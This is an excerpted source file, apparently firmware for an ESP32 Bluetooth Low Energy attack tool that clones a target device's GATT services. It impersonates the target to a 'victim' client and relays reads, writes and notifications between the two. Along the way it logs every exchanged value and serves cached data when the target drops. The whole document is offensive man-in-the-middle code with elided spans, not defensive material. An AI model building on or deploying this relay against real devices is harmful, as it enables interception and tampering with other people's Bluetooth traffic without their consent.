...
void prep_write_event_env(esp_ble_gatts_cb_param_t *param){
  ...
  snprintf(out, sizeof(out), "PREP WRITE %s (victim -> %s): if: %x conn_id: %x tx_id: %" PRIu32 " offset: %" PRIu16 " handle: 0x%02x uuid: %s\n%s",
          isDescriptor ? "DESC" : "CHAR",
          connected ? "target" : "cache",
          clone.gattc_if, clone.target_client_conn_id,
          param->write.trans_id, param->write.offset,
          param->write.handle, uuid, value);
  GattAttackApp::sendOutput(out);
  free(value);
...
void server_event(esp_gatts_cb_event_t event, esp_gatt_if_t gatts_if, esp_ble_gatts_cb_param_t *param) {
  switch (event) {
    case ESP_GATTS_REG_EVT: {
      ...
      GattAttackApp::sendOutput(send);

      for (size_t i = 0; i < clone.num_services; i++) {
        /**
        ESP_LOGI(TAG, "Service %zu: %x (%i)", 
                i,
                clone.services[i].service_uuid.uuid.uuid16,
                (int)clone.services[i].service_handle);
        */
        ...
        for (size_t j = 0; j < clone.services[i].num_chars; j++) {
          /**
          ESP_LOGI(TAG, "  Char %zu: %x (%x)",
                  j,
                  clone.services[i].chars[j].char_uuid.uuid.uuid16,
                  clone.services[i].chars[j].char_handle);
          */

          for (size_t k = 0; k < clone.services[i].chars[j].num_descs; k++) {
            /**
            ESP_LOGI(TAG, "    Desc %zu: %x (%x)",
                    k,
                    clone.services[i].chars[j].descs[k].desc_uuid.uuid.uuid16,
                    clone.services[i].chars[j].descs[k].desc_handle);
            */
          }
        }
    ...
    case ESP_GATTS_READ_EVT: { 
      ...
      snprintf(out, sizeof(out), "READ %s (victim -> %s): if: %x conn_id: %x tx_id: %" PRIu32 " handle: 0x%02x uuid: %s",
              isDescriptor ? "DESC" : "CHAR",
              connected ? "target" : "cache",
              clone.gattc_if, clone.target_client_conn_id,
...
after_find_read:
        ...
        snprintf(out, sizeof(out), "READ %s RSP (cache -> victim): if: %x conn_id: %x tx_id: %" PRIu32 " handle: 0x%02x uuid: %s\n%s",
              isDescriptor ? "DESC" : "CHAR",
              clone.gattc_if, clone.target_client_conn_id,
              param->read.trans_id, param->read.handle,
              uuid, hexVal);
    ...
    case ESP_GATTS_WRITE_EVT: {
       ...
       * event to a target device
       *
       * We log the information and write
       * it to the real target device.
       *
       * The response is handled in the client.
       */
      ...
      char* value = bytes_to_hex_string(param->write.value, param->write.len);
      snprintf(out, sizeof(out), "WRITE %s (victim -> %s): if: %x conn_id: %x tx_id: %" PRIu32 " handle: 0x%02x uuid: %s\n%s",
              isDescriptor ? "DESC" : "CHAR",
              connected ? "target" : "cache",
              clone.gattc_if, clone.target_client_conn_id,
      ...
      for (int x = 0; x < clone.num_services; x++) {
        for (int y = 0; y < clone.services[x].num_chars; y++) {
          if (clone.services[x].chars[y].char_handle == param->write.handle) {
            clone.services[x].chars[y].value.attr_len = param->write.len;
            if (clone.services[x].chars[y].value.attr_value != NULL) {
              free(clone.services[x].chars[y].value.attr_value);
            }
            clone.services[x].chars[y].value.attr_value = (uint8_t*)malloc(param->write.len);
            memcpy(clone.services[x].chars[y].value.attr_value, param->write.value, param->write.len);
            goto after_find_write;
          } else {
            for (int z = 0; z < clone.services[x].chars[y].num_descs; z++) {
              if (clone.services[x].chars[y].descs[z].desc_handle == param->write.handle) {
                clone.services[x].chars[y].descs[z].value.attr_len = param->write.len;
                if (clone.services[x].chars[y].descs[z].value.attr_value != NULL) {
                  free(clone.services[x].chars[y].descs[z].value.attr_value);
                }
                clone.services[x].chars[y].descs[z].value.attr_value = (uint8_t*)malloc(param->write.len);
                memcpy(clone.services[x].chars[y].descs[z].value.attr_value, param->write.value, param->write.len);
                goto after_find_write;
              }
            }
          }
...
after_find_write:
      if (param->write.need_rsp) {
          ...
          char out[138];
          snprintf(out, sizeof(out), "WRITE %s RSP (cache -> victim): if: %i conn_id: %x tx_id: %i handle: 0x%02x uuid: %s",
                  isDescriptor ? "DESC" : "CHAR",
                  gatts_if,
                  clone.server_conn_id,
                  clone.server_trans_id,
    ...
    case ESP_GATTS_EXEC_WRITE_EVT: {
      ...
      sprintf(out, "%s WRITE (victim -> %s): : if: %x conn_id: %x tx_id: %" PRIu32 "\n%s",
              execute ? "EXEC" : "ABORT",
              connected ? "target" : "cache",
              clone.gatts_if,
    ...
    case ESP_GATTS_START_EVT: {   
      ...
      if (cloned_service_num >= clone.num_services) {
        GattAttackApp::sendOutput("GATT Clone Success");
    ...
    case ESP_GATTS_CONNECT_EVT: {
      ...
      if (memcmp(clone.target_bda, param->connect.remote_bda, sizeof(clone.target_bda)) == 0) {
        GattAttackApp::sendOutput("TARGET DEVICE HAS CONNECTED TO OUR GATTS");
  ...
  switch (event) {
    ...
    case ESP_GATTC_CONNECT_EVT: {
      ...
      if (memcmp(clone.target_bda, param->connect.remote_bda, sizeof(clone.target_bda)) == 0) {
        connected = true;
        connecting = false;
        GattAttackApp::sendOutput("Target Device Client Connected.");
        gattAttackState = GATT_ATTACK_STATE_CLIENT_CONNECTED;
        GattAttackApp::sendState((int)gattAttackState);
        clone.target_client_conn_id = param->connect.conn_id;
        leds->blink(0, 0, 255);
      } else {
        GattAttackApp::sendOutput("Victim Device Connected");
    ...
    case ESP_GATTC_DISCONNECT_EVT: {
      ...
      if (memcmp(clone.target_bda, param->disconnect.remote_bda, 6) == 0) {
        GattAttackApp::sendOutput("Lost Client Connection");
        connected = false;
        ...
        if (retries < MAX_RETRIES) {
          ...
          if (!clone_init) {
            ...
            GattAttackApp::sendOutput("Attack Failed :(");
            gattAttackState = GATT_ATTACK_STATE_CLIENT_CONNECT_FAIL;
            GattAttackApp::sendState((int)gattAttackState);
          } else {
            GattAttackApp::sendOutput("Giving up reconnecting to target. Read/writes will happen from cache");
          }
        }
      } else {
        GattAttackApp::sendOutput("Lost Victim Connection");
        leds->blink(255, 0, 0);
      }
    ...
    case ESP_GATTC_DIS_SRVC_CMPL_EVT: {
      ...
      GattAttackApp::sendOutput("Discover Services Complete!");
    ...
    case ESP_GATTC_SEARCH_CMPL_EVT: {
      ...
      GattAttackApp::sendOutput("GATT Server starting");
      break;
    }
    case ESP_GATTC_REG_FOR_NOTIFY_EVT: {
      ...
      GattAttackApp::sendOutput("Client register notify success");
    ...
    case ESP_GATTC_NOTIFY_EVT: {
       ...
       * a notify event.
       *
       * Here we log the information and
       * pass it back to our victim.
       */
      ...
      sprintf(out, "%s RSP (target -> victim): if: %x conn_id: %x handle: 0x%02x uuid: %s\n%s",
    ...
    case ESP_GATTC_WRITE_DESCR_EVT: {
      ...
      if (clone.server_last_write_needs_rsp) {
        ...
        char out[158];
        snprintf(out, sizeof(out), "WRITE DESC RSP (target -> victim): if: %i conn_id: %x tx_id: %i status: %x handle: 0x%02x uuid: %s",
                gattc_if,
                param->write.conn_id,
                clone.server_trans_id,
                param->write.status,
    ...
    case ESP_GATTC_WRITE_CHAR_EVT: {
      ...
      if (clone.server_last_write_needs_rsp) {
        ...
        char out[200];
        snprintf(out, sizeof(out), "WRITE CHAR RSP (target -> victim): if: %i conn_id: %x tx_id: %i status: %i handle: 0x%02x uuid: %s",
                gattc_if,
                param->write.conn_id,
                clone.server_trans_id,
                param->write.status,
    ...
    case ESP_GATTC_PREP_WRITE_EVT: {
      ...
      char uuid[38];
      get_uuid_for_handle(param->write.handle, uuid);
      sprintf(out, "PREP WRITE RSP (target -> victim): if: %i conn_id: %x status: %x handle: 0x%02x uuid: %s",
              gattc_if,
              clone.server_conn_id,
              param->write.status,
              param->write.handle,
    ...
    case ESP_GATTC_EXEC_EVT: {
       ...
       */
      char out[80];
      sprintf(out, "EXEC RSP (target -> victim): if: %i conn_id: %x tx_id: %i status: %x",
              gattc_if,
              clone.server_trans_id,
    ...
    case ESP_GATTC_READ_CHAR_EVT: {
       ...
       * a read event.
       *
       * Here we log this event and send
      ...
      get_uuid_for_handle(param->read.handle, uuid);
      snprintf(out, sizeof(out), "READ CHAR RSP (target -> victim): if: %i conn_id: %x tx_id: %i status: %x handle: 0x%02x uuid: %s\n%s",
              gattc_if,
              param->read.conn_id,
              clone.server_trans_id,
              param->read.status,
      ...
      memset(&rsp, 0, sizeof(esp_gatt_rsp_t));
      rsp.attr_value.handle = param->read.handle;
      rsp.attr_value.len = param->read.value_len;
      memcpy(rsp.attr_value.value, param->read.value, param->read.value_len);
      esp_ble_gatts_send_response(clone.gatts_if,
                                  clone.server_conn_id,
                                  clone.server_trans_id,
                                  ESP_GATT_OK, &rsp);
    ...
    case ESP_GATTC_READ_DESCR_EVT: {
      ...
      char* val = bytes_to_hex_string(param->read.value, param->read.value_len);
      get_uuid_for_handle(param->read.handle, uuid);
      snprintf(out, sizeof(out), "READ DESC RSP (target -> victim): if: %i conn_id: %x tx_id: %i status: %x handle: 0x%02x uuid: %s\n%s",
              gattc_if,
              param->read.conn_id,
              clone.server_trans_id,
              param->read.status,
...
void esp_gap_cb(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param) {
  ...
  switch (event) {
    ...
    case ESP_GAP_BLE_SCAN_START_COMPLETE_EVT: {
      ...
      GattAttackApp::sendOutput("Scan started");
      break;
    }
        ...
        case ESP_GAP_SEARCH_INQ_RES_EVT: {
          ...
          if (memcmp(clone.target, param->scan_rst.bda, sizeof(esp_bd_addr_t)) == 0) {
            ...
            if (!connected || !connecting) {
              ...
              GattAttackApp::sendOutput("Connecting to target");
    ...
    case ESP_GAP_BLE_ADV_START_COMPLETE_EVT: {
      ...
      if (param->adv_start_cmpl.status != ESP_BT_STATUS_SUCCESS) {
        ...
        GattAttackApp::sendOutput("Advertisment Started. Hack the plan8");
      }
